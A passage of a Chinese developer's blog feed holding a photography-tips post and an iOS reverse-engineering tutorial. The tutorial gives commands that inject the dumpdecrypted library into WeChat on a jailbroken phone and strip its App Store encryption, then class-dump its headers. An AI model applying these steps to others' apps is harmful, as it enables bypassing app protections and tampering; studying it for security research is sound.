&lt;p&gt;阮一峰前辈在&lt;a href=&quot;http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;博客&lt;/a&gt;中给出了&lt;a href=&quot;http://paulmillr.com/posts/simple-description-of-popular-software-licenses/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Paul Miller&lt;/a&gt;绘制图片的中文版，但是感觉略有不同，下面给出我画的开源许可证快速选择图片。&lt;/p&gt;
&lt;p&gt;一目了然：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9.png&quot; alt=&quot;开源许可证快速选择&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>日常摄影 Tips</title>
    <link href="http://zhoulingyu.com/2016/10/10/%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips/"/>
    <id>http://zhoulingyu.com/2016/10/10/日常摄影 Tips/</id>
    <published>2016-10-10T16:19:00.000Z</published>
    <updated>2017-05-15T02:48:26.483Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>去享受生活中的每一个令人感动的瞬间</p>
</blockquote>
<p>偶尔也写个和代码无关的。</p>
<a id="more"></a>
<p>对于日常摄影，手机也足够了，重要的不是机器。</p>
<p>本篇不会涉及相机技术，只是一些基本的技巧，如果你恰巧在绘画方面毫无天赋，又是一个经常被人说『不会』拍照的人，这篇文章也许对你非常有用。</p>
<h2 id="三分钟提升一个档次"><a href="#三分钟提升一个档次" class="headerlink" title="三分钟提升一个档次"></a>三分钟提升一个档次</h2><h3 id="1-黄金分割点"><a href="#1-黄金分割点" class="headerlink" title="1 黄金分割点"></a>1 黄金分割点</h3><p>黄金分割，即 1 : 0.618 的比例，相当于三、七分和四、六分的中间。</p>
<p>有几种大致找黄金分割点的方式。第一种是<strong>对角线垂直线</strong>。矩形中，绘制一条对角线，从矩形其他两点中一点向直线做垂线，相交点即黄金分割点。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-001.png" alt="垂直线找黄金分割点"></p>
<p>将相片中的重点放在黄金分割点可以使重点更加突出，因为人会更容易注意到处在黄金分割点附近的部分。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-002.png" alt="垂直线找黄金分割点"></p>
<p>这种分割方式将矩形画面分割成三个范围，通过这样的方式也可以找到一个好的构图模式。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-003.png" alt="垂直线找黄金分割点"></p>
<p>另一种方法就是<strong>九宫格</strong>。因为黄金分割近似于 2/3 ，所以用九宫格对摄影新手来说也是一个很好的选择，很多相机和手机本身也会提供九宫格参考线。</p>
<p>九宫格分割出的四个点都是近似黄金分割点。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-004.png" alt="九宫格"></p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-005.png" alt="九宫格"></p>
<h3 id="2-中间不一定是最好的，中间也许是最好的"><a href="#2-中间不一定是最好的，中间也许是最好的" class="headerlink" title="2 中间不一定是最好的，中间也许是最好的"></a>2 中间不一定是最好的，中间也许是最好的</h3><p>上面所用到的黄金分割可以使照片的画面更加和谐自然，也就是说稍微的不对称是一种美感，但是对称就没有美感吗？事实上有很多时候将照片的主题放在中央，或者使用对称的方式构造画面会更加好。比如中国的传统建筑往往突出对称，所以拍摄时候采用对称的构图方式也会取得极佳的效果。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-006.jpg" alt="对称美感"></p>
<h3 id="3-视角"><a href="#3-视角" class="headerlink" title="3 视角"></a>3 视角</h3><p>视角往往是很多拍摄者忽略的一点。很多景色屡拍不满，无论如何也无法达到心中的构图，那么很有可能你需要换一个视角。</p>
<p>一个典型的例子是拍摄动物，人们总是会忽略『人比动物高』，那么往往拍出来的照片是这样的：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-007.jpg" alt="俯角拍摄"></p>
<p>如果你尝试蹲下来，从动物的角度拍摄，那么你拍出来的照片可能是这样的：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-008.jpg" alt="平角拍摄"></p>
<p>是不是亲切感倍增呢？所以，当拍摄动物的时候，不妨试着从他们的角度，看看他们的世界。</p>
<h2 id="没什么比构图更重要"><a href="#没什么比构图更重要" class="headerlink" title="没什么比构图更重要"></a>没什么比构图更重要</h2><p>尝试了上面 3 个常用技巧后有没有发现自己的拍照水平提升一个档次呢？</p>
<p>摄影如绘画，讲究的是画面感。追根揭底对日常摄影来说最重要的是『构图』，一旦照片构图合理，照片绝对不会丑到哪里去。</p>
<p>那么除了以上三个极实用的技巧，再来补充一点其他构图方法。</p>
<h3 id="1-突出重点，追求简洁"><a href="#1-突出重点，追求简洁" class="headerlink" title="1 突出重点，追求简洁"></a>1 突出重点，追求简洁</h3><p>拍摄照片，往往是因为『啊，那个猫咪好可爱』、『那朵花很美』。</p>
<p>如果你明确你的拍摄对象，就在构图时将其他多余的元素去除，这样可以获得很好的效果，甚至你可以把被拍摄物体放在白色或者黑色背景下。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-009.png" alt="突出重点，追求简洁"></p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-010.jpg" alt="突出重点，追求简洁"></p>
<h3 id="2-利用前景布局"><a href="#2-利用前景布局" class="headerlink" title="2 利用前景布局"></a>2 利用前景布局</h3><p>如果利用得当，前景的通常能起到很大的作用。</p>
<p>在风景摄影中，利用前景能增强画面的纵深感和层次感。<br>在人像摄影中，能够增加更多的艺术效果，或者增强气氛。</p>
<p>前景是一个相对的概念，并不以绝对的空间距离大小作为判断标准。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-011.jpg" alt="利用前景布局"></p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-012.jpg" alt="利用前景布局"></p>
<p>虚化状前景可以很好的凸出主题，同时能够借助前景渲染画面色彩。</p>
<h2 id="日常后期"><a href="#日常后期" class="headerlink" title="日常后期"></a>日常后期</h2><h3 id="1-模糊系列"><a href="#1-模糊系列" class="headerlink" title="1 模糊系列"></a>1 模糊系列</h3><p>常用的 PS 技巧里，模糊算的上常用了。通常，手机拍摄的照片不能很好的让背景虚化，通过后期处理，可以让手机拍摄的照片也有出色的虚化效果，或者其他的艺术效果。以一张图片为例。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-017.jpg" alt="花朵图片"></p>
<p>1.1 高斯模糊</p>
<p>背景虚化往往可以通过高斯模糊实现。这里简单的将需要模糊的地方选出，选择 <code>滤镜</code> -&gt; <code>模糊</code> -&gt; <code>高斯模糊</code>。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-018.png" alt="高斯模糊"></p>
<p>调整半径，可以看到很明显的效果。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-019.png" alt="高斯模糊"></p>
<p>1.2 动感模糊</p>
<p>动感模糊可以营造出一种速度感，但通过恰当的运用也可以制造不一样的艺术感。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-020.png" alt="动感模糊"></p>
<h3 id="2-曲线"><a href="#2-曲线" class="headerlink" title="2 曲线"></a>2 曲线</h3><p>现在很多手机 APP 也可以进行曲线修图，对于很多人来说修图也不一定非要使用 PS。不过这里以 PS 为例。</p>
<p>用一张普通的手机拍摄的图片 </p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-013.png" alt="咖啡图片"></p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-014.png" alt="RGB 通道曲线调整"></p>
<p>在 RGB 通道下，当一个曲线的形态呈现出 S 形时，可以提升画面的对比度。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-015.png" alt="增加胶片感"></p>
<p>曲线左端端点被向上移动，画面会像是蒙上了一层灰，出现一种胶片般的复古质感。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-016.png" alt="红色通道曲线调整"></p>
<p>红色通道下，压暗曲线的时候，画面就会被加入上一层青色；提亮曲线，画面会被加入一层红色。</p>
<p>蓝色通道下，提亮曲线画面会被加入一层蓝色；压暗曲线，画面就会加入一层黄色。</p>
<h3 id="3-玄乎的艺术感"><a href="#3-玄乎的艺术感" class="headerlink" title="3 玄乎的艺术感"></a>3 玄乎的艺术感</h3><p>照片的艺术感或者说特色需要有一双审美的眼睛。在做后期处理时，需要你去思考。当看到一张照片的时候，需要去设想这样照片更好看的样子，然后一步步的做处理。这里运用上面的一些技巧，简单的做一个例子（比较粗糙），帮助大家综合运用。</p>
<p>这是一张红狐的奔跑照片。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-021.png" alt="红狐奔跑"></p>
<p>可以通过曲线将画面调亮。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-022.png" alt="RGB 通道曲线调整"></p>
<p>稍稍调整蓝色通道曲线，使红狐的黑色毛皮在阳光显得更有色彩。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-023.png" alt="蓝色通道曲线调整"></p>
<p>稍稍调整饱和度。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-024.png" alt="饱和度调整"></p>
<p>复制图层，选中红狐之外的区域，添加动感模糊。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E6%97%A5%E5%B8%B8%E6%91%84%E5%BD%B1%20Tips-025.png" alt="动感模糊"></p>
<h2 id="图片来源"><a href="#图片来源" class="headerlink" title="图片来源"></a>图片来源</h2><blockquote>
<p>本篇中的照片取自：</p>
<ol>
<li>个人拍摄</li>
<li>《爱摄影》杂志</li>
<li><a href="http://cn.forwallpaper.com/" target="_blank" rel="external">ForWallpaper</a></li>
<li><a href="http://sspai.com/33571" target="_blank" rel="external">少数派·想要拍张好照片，学会利用「前景」很重要 | 手机摄影技巧</a></li>
</ol>
</blockquote>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#99;&#111;&#x64;&#x65;&#114;&#102;&#x69;&#x73;&#x68;&#x40;&#49;&#54;&#51;&#x2e;&#99;&#x6f;&#x6d;">&#99;&#111;&#x64;&#x65;&#114;&#102;&#x69;&#x73;&#x68;&#x40;&#49;&#54;&#51;&#x2e;&#99;&#x6f;&#x6d;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;去享受生活中的每一个令人感动的瞬间&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;偶尔也写个和代码无关的。&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://zhoulingyu.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="http://zhoulingyu.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>iOS攻防——（四）class-dump 与 Dumpdecrypted 使用</title>
    <link href="http://zhoulingyu.com/2016/08/30/iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E5%9B%9B%EF%BC%89class-dump%20%E4%B8%8E%20Dumpdecrypted%20%E4%BD%BF%E7%94%A8/"/>
    <id>http://zhoulingyu.com/2016/08/30/iOS攻防——（四）class-dump 与 Dumpdecrypted 使用/</id>
    <published>2016-08-30T13:09:36.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-class-dump"><a href="#1-class-dump" class="headerlink" title="1 class dump"></a>1 class dump</h1><p>class dump 是一个用于检查保存在 Mach-O 文件中的 objective-c 运行时信息的工具，攻防中最常用、实用的命令行工具。</p>
<h2 id="1-1-class-dump-好玩在哪？"><a href="#1-1-class-dump-好玩在哪？" class="headerlink" title="1.1 class dump 好玩在哪？"></a>1.1 class dump 好玩在哪？</h2><p>class dump 绝对可以满足你的好奇心。你可以通过 class dump ：</p>
<ol>
<li>查看闭源的应用、frameworks、bundles。</li>
<li>对比一个 APP 不同版本之间的接口变化。</li>
<li>对一些私有 frameworks 做些有趣的试验。</li>
</ol>
<h2 id="1-2-Download"><a href="#1-2-Download" class="headerlink" title="1.2 Download"></a>1.2 Download</h2><p>当前版本: 3.5 (64 bit Intel)<br>需要 Mac OS X 10.8 或更高版本</p>
<p><a href="http://stevenygard.com/download/class-dump-3.5.dmg" target="_blank" rel="external">class-dump-3.5.dmg</a><br><a href="http://stevenygard.com/download/class-dump-3.5.tar.gz" target="_blank" rel="external">class-dump-3.5.tar.gz</a><br><a href="http://stevenygard.com/download/class-dump-3.5.tar.bz2" target="_blank" rel="external">class-dump-3.5.tar.bz2</a></p>
<h2 id="1-3-Use"><a href="#1-3-Use" class="headerlink" title="1.3 Use"></a>1.3 Use</h2><a id="more"></a>
<p>下载好后，双击dmg文件，将其中的 class-dump 文件放到/usr/local/sbin 目录下，然后就可以在命令行中使用了。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E5%9B%9B%EF%BC%89class%20dump%20%E4%BD%BF%E7%94%A8-01.png" alt=""></p>
<p>官方用法指南：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">class-dump 3.5 (64 bit)</div><div class="line">Usage: class-dump [options] &lt;mach-o-file&gt;</div><div class="line"></div><div class="line">  where options are:</div><div class="line">        -a             show instance variable offsets</div><div class="line">        -A             show implementation addresses</div><div class="line">        --arch &lt;arch&gt;  choose a specific architecture from a universal binary (ppc, ppc64, i386, x86_64)</div><div class="line">        -C &lt;regex&gt;     only display classes matching regular expression</div><div class="line">        -f &lt;str&gt;       find string in method name</div><div class="line">        -H             generate header files in current directory, or directory specified with -o</div><div class="line">        -I             sort classes, categories, and protocols by inheritance (overrides -s)</div><div class="line">        -o &lt;dir&gt;       output directory used for -H</div><div class="line">        -r             recursively expand frameworks and fixed VM shared libraries</div><div class="line">        -s             sort classes and categories by name</div><div class="line">        -S             sort methods by name</div><div class="line">        -t             suppress header in output, for testing</div><div class="line">        --list-arches  list the arches in the file, then exit</div><div class="line">        --sdk-ios      specify iOS SDK version (will look in /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS&lt;version&gt;.sdk</div><div class="line">        --sdk-mac      specify Mac OS X version (will look in /Developer/SDKs/MacOSX&lt;version&gt;.sdk</div><div class="line">        --sdk-root     specify the full SDK root path (or use --sdk-ios/--sdk-mac for a shortcut)</div></pre></td></tr></table></figure>
<p>简单的举例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">class-dump -H /Applications/Calculator.app -o ~/Desktop/dump/Calculate-dump</div></pre></td></tr></table></figure>
<p><code>/Applications/Calculator.app</code> 是 Mac 上计算器应用的路径。<br><code>~/Desktop/dump/Calculate-dump</code> 是指定的存放 dump 出来头文件的文件夹路径。</p>
<p>执行完成后可以看到指定的保存目录下已经有 dump 出来的头文件了：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E5%9B%9B%EF%BC%89class%20dump%20%E4%BD%BF%E7%94%A8-02.png" alt=""></p>
<p>打开一个 <code>.h</code> 文件可以看到相应内容：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E5%9B%9B%EF%BC%89class%20dump%20%E4%BD%BF%E7%94%A8-03.png" alt=""></p>
<h1 id="2-Dumpdecrypted"><a href="#2-Dumpdecrypted" class="headerlink" title="2 Dumpdecrypted"></a>2 Dumpdecrypted</h1><p>class dump 虽然能帮你解析出一个 app 的头文件，但是对于 App Store 下载的 App 都是通过苹果的一层签名加密，通常我们成为『加壳』。对于已经加壳的 APP，解析后的效果就和加了代码混淆类似。</p>
<p>比如直接去 dump 微信，出来的结果大概是这样：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E5%9B%9B%EF%BC%89class%20dump%20%E4%BD%BF%E7%94%A8-04.png" alt=""></p>
<h2 id="2-1-Download"><a href="#2-1-Download" class="headerlink" title="2.1 Download"></a>2.1 Download</h2><p><a href="https://github.com/stefanesser/dumpdecrypted" target="_blank" rel="external">dumpdecrypted GitHub 地址</a></p>
<h2 id="2-2-Install"><a href="#2-2-Install" class="headerlink" title="2.2 Install"></a>2.2 Install</h2><p>Dumpdecrypted 比另一个砸壳工具 Clutch 要难用的多。但由于 Clutch 无法砸开含有兼容 WatchOs<br>2 的 App，所以只能使用 Dumpdecrypted。</p>
<p>下载后打开 <code>Makefile</code> 文件，注意第三行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ SDK=`xcrun --sdk iphoneos --show-sdk-path`</div></pre></td></tr></table></figure>
<p>这里填写的 SDK 必须与你越狱的 iPhone 系统等级一致，你可以这样查看你 MAC 的 SDK ：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ xcrun --sdk iphoneos --show-sdk-path</div></pre></td></tr></table></figure>
<p>输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS9.3.sdk</div></pre></td></tr></table></figure>
<p>而我的手机是 7.0 的，所以只能去这里下载对应的 SDK。</p>
<p>Makefile 所有需要填写的填好后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cd dumpdecrypted</div><div class="line">$ make</div></pre></td></tr></table></figure>
<p>在当前目录下生成 dumpdecrypted.dylib 文件。</p>
<p>如果你觉得很麻烦，可以直接来<a href="https://github.com/DaSens/Crack-file/tree/master/crack%20file" target="_blank" rel="external">这里</a>或者<a href="http://git.oschina.net/hongyangyi/dumpdecrypted" target="_blank" rel="external">这里</a>下载。</p>
<h2 id="2-3-Use"><a href="#2-3-Use" class="headerlink" title="2.3 Use"></a>2.3 Use</h2><p>将 <code>dumpdecrypted.dylib</code> 放到需要砸壳 app 的 Documents 下。</p>
<p>查找微信的 Documents：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ find / -name WeChat.app</div></pre></td></tr></table></figure>
<p>得到路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/private/var/mobile/Applications/3DE3657E-0F69-45FF-928B-3DD5CD7A59FD/WeChat.app</div></pre></td></tr></table></figure>
<p>scp 传输：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ scp ~/Desktop/dump/dumpdecrypted/dumpdecrypted_7.dylib root@172.16.212.217:/private/var/mobile/Applications/3DE3657E-0F69-45FF-928B-3DD5CD7A59FD/Documents</div></pre></td></tr></table></figure>
<p>砸壳：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ cd /private/var/mobile/Applications/3DE3657E-0F69-45FF-928B-3DD5CD7A59FD/Documents</div><div class="line">$ DYLD_INSERT_LIBRARIES=dumpdecrypted_7.dylib /private/var/mobile/Applications/3DE3657E-0F69-45FF-928B-3DD5CD7A59FD/WeChat.app/WeChat</div></pre></td></tr></table></figure>
<blockquote>
<p>注意 <code>DYLD_INSERT_LIBRARIES=</code> 后填写的是你刚刚传输的 .dylib 文件名，我的是 dumpdecrypted_7.dylib</p>
</blockquote>
<p>砸壳成功：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[+] detected 32bit ARM binary in memory.</div><div class="line">[+] offset to cryptid found: @0xfea4c(from 0xfe000) = a4c</div><div class="line">[+] Found encrypted data at address 00004000 of length 42237952 bytes - type 1.[+] Opening /private/var/mobile/Applications/3DE3657E-0F69-45FF-928B-3DD5CD7A59FD/WeChat.app/WeChat for reading.</div><div class="line">[+] Reading header</div><div class="line">[+] Detecting header type[+] Executable is a FAT image - searching for right architecture[+] Correct arch is at offset 16384 in the file[+] Opening WeChat.decrypted for writing.</div><div class="line">[+] Copying the not encrypted start of the file[+] Dumping the decrypted data into the file[+] Copying the not encrypted remainder of the file[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset 4a4c</div><div class="line">[+] Closing original file[+] Closing dump file</div></pre></td></tr></table></figure>
<p>ls 查看 Documents 中文件多了一个 <code>WeChat.decrypted</code>，这就是砸壳过后的文件，scp出来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ scp WeChat.decrypted zhoulingyu@172.16.211.181:/Users/zhoulingyu/Desktop/dump/Wechat</div></pre></td></tr></table></figure>
<h1 id="3-class-dump-砸壳后的文件"><a href="#3-class-dump-砸壳后的文件" class="headerlink" title="3 class dump 砸壳后的文件"></a>3 class dump 砸壳后的文件</h1><p>上一步我们得到了 <code>WeChat.decrypted</code>，现在可以对其进行 dump：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">class-dump --arch armv7 WeChat.decrypted -H -o /Users/zhoulingyu/Desktop/dump/Wechat/Wechat-decrypted-dump</div></pre></td></tr></table></figure>
<blockquote>
<p>–arch armv7 是指定架构，dumpdecrypted 只会砸你手机处理器对应的那个壳，fat binary 的其它部分仍然是有壳的，而 class-dump 的默认目标又不是被砸壳的那个部分，如果不指定架构只能导出 CDStructures.h 一个文件</p>
<p>现在就可以看到 dump 后是明文的了：</p>
</blockquote>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E6%94%BB%E9%98%B2%E2%80%94%E2%80%94%EF%BC%88%E5%9B%9B%EF%BC%89class%20dump%20%E4%BD%BF%E7%94%A8-05.png" alt=""></p>
<h1 id="4-Learn-More"><a href="#4-Learn-More" class="headerlink" title="4 Learn More"></a>4 Learn More</h1><p>当你能看到 .h 文件时候，意味着你知道了这个应用程序的各种接口，除了学习别人的优雅代码之外，显然也也可以做一些更有意思的事情，通过一些猜想和试验，我们可以去尝试做一个微信的插件。</p>
<p>下一次iOS攻防将会介绍动态库的注入和微信插件的制作~</p>
<p>如果您感兴趣~请点击下方打赏支持萌妹子的原创哟~</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#x63;&#111;&#100;&#101;&#x72;&#102;&#105;&#115;&#104;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#x6f;&#109;">&#x63;&#111;&#100;&#101;&#x72;&#102;&#105;&#115;&#104;&#64;&#x31;&#x36;&#51;&#x2e;&#99;&#x6f;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-class-dump&quot;&gt;&lt;a href=&quot;#1-class-dump&quot; class=&quot;headerlink&quot; title=&quot;1 class dump&quot;&gt;&lt;/a&gt;1 class dump&lt;/h1&gt;&lt;p&gt;class dump 是一个用于检查保存在 Mach-O 文件中的 objective-c 运行时信息的工具，攻防中最常用、实用的命令行工具。&lt;/p&gt;
&lt;h2 id=&quot;1-1-class-dump-好玩在哪？&quot;&gt;&lt;a href=&quot;#1-1-class-dump-好玩在哪？&quot; class=&quot;headerlink&quot; title=&quot;1.1 class dump 好玩在哪？&quot;&gt;&lt;/a&gt;1.1 class dump 好玩在哪？&lt;/h2&gt;&lt;p&gt;class dump 绝对可以满足你的好奇心。你可以通过 class dump ：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;查看闭源的应用、frameworks、bundles。&lt;/li&gt;
&lt;li&gt;对比一个 APP 不同版本之间的接口变化。&lt;/li&gt;
&lt;li&gt;对一些私有 frameworks 做些有趣的试验。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;1-2-Download&quot;&gt;&lt;a href=&quot;#1-2-Download&quot; class=&quot;headerlink&quot; title=&quot;1.2 Download&quot;&gt;&lt;/a&gt;1.2 Download&lt;/h2&gt;&lt;p&gt;当前版本: 3.5 (64 bit Intel)&lt;br&gt;需要 Mac OS X 10.8 或更高版本&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://stevenygard.com/download/class-dump-3.5.dmg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;class-dump-3.5.dmg&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://stevenygard.com/download/class-dump-3.5.tar.gz&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;class-dump-3.5.tar.gz&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://stevenygard.com/download/class-dump-3.5.tar.bz2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;class-dump-3.5.tar.bz2&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-3-Use&quot;&gt;&lt;a href=&quot;#1-3-Use&quot; class=&quot;headerlink&quot; title=&quot;1.3 Use&quot;&gt;&lt;/a&gt;1.3 Use&lt;/h2&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/categories/iOS/iOS%E6%94%BB%E9%98%B2/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
      <category term="iOS攻防" scheme="http://zhoulingyu.com/tags/iOS%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>[来自Github·sparanoid]中文文案排版指北</title>
    <link href="http://zhoulingyu.com/2016/08/29/%E6%9D%A5%E8%87%AAGithub%C2%B7sparanoid-%E4%B8%AD%E6%96%87%E6%96%87%E6%A1%88%E6%8E%92%E7%89%88%E6%8C%87%E5%8C%97/"/>
    <id>http://zhoulingyu.com/2016/08/29/来自Github·sparanoid-中文文案排版指北/</id>
    <published>2016-08-29T13:03:01.000Z</published>
    <updated>2017-05-15T02:48:26.483Z</updated>
    
